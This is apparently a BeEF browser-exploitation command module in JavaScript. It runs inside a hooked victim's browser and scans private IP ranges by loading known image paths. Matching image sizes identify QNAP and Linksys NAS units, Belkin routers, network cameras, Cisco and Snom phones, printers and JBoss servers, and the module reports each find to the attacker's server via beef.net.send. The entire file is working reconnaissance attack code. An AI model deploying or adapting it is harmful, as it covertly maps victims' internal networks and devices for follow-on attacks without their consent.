beef.execute(function() {

	var dom = document.createElement('b');

	var ips = [
		'http://192.168.0.1',
		'http://192.168.0.100',
		'http://192.168.0.254',
		'http://192.168.1.1',
		'http://192.168.1.100',
		'http://192.168.1.254',
		'http://10.0.0.1',
		'http://10.1.1.1',
		'http://192.168.2.1',
		'http://192.168.2.254',
		'http://192.168.100.1',
		'http://192.168.100.254',
		'http://192.168.123.1',
		'http://192.168.123.254',
        'http://192.168.10.1'
	];
	var urls = new Array(
	new Array("QNAP NAS",":8080","/ajax_obj/img/running.gif",16,16),
	new Array("QNAP NAS",":8080","/ajax_obj/images/qnap_logo_w.gif",115,21),
	new Array("Belkin Router",":80","/images/title_2.gif",321,28),
	new Array("SMC Networks",":80","/images/logo.gif",133,59),
	new Array("Linksys NAS",":80","/Admin_top.JPG",750,52),
	new Array("Linksys NAS",":80","/logo.jpg",194,52),
	new Array("Linksys Network Camera",":80","/welcome.jpg",146,250),
	new Array("Linksys Wireless-G Camera",":80","/header.gif",750,97),
	new Array("Cisco IP Phone",":80","/Images/Logo",120,66),
	new Array("Snom Phone",":80","/img/snom_logo.png",168,62),
	new Array("Brother Printer",":80","/pbio/brother.gif",144,52),
	new Array("HP LaserJet",":80","/hp/device/images/logo.gif",42,27),
    new Array("JBoss Application server",":8080","/images/logo.gif",226,105)
	);
    //console.log("Array loaded [" + urls + "]");

	// for each ip
	for(var i=0; i < ips.length; i++) {

		// for each url
		for(var u=0; u < urls.length; u++) {
			var img = new Image;
            //console.log("Detecting  [" + urls[u][0] + "] at IP [" + ips[i] + "]");
			img.id = u;
			img.src = ips[i]+urls[u][1]+urls[u][2];
			//img.title = ips[i]+urls[u][1];
			img.onload = function() { if (this.width == urls[this.id][3] && this.height == urls[this.id][4]) { beef.net.send('<%= @command_url %>', <%= @command_id %>,'device='+escape(urls[this.id][0])+"&url="+escape(this.src));dom.removeChild(this); } }
			dom.appendChild(img);
		}
	}
	// setTimeout("beef.net.send('<%= @command_url %>', <%= @command_id %>,'device=Failed')", 60000)

});

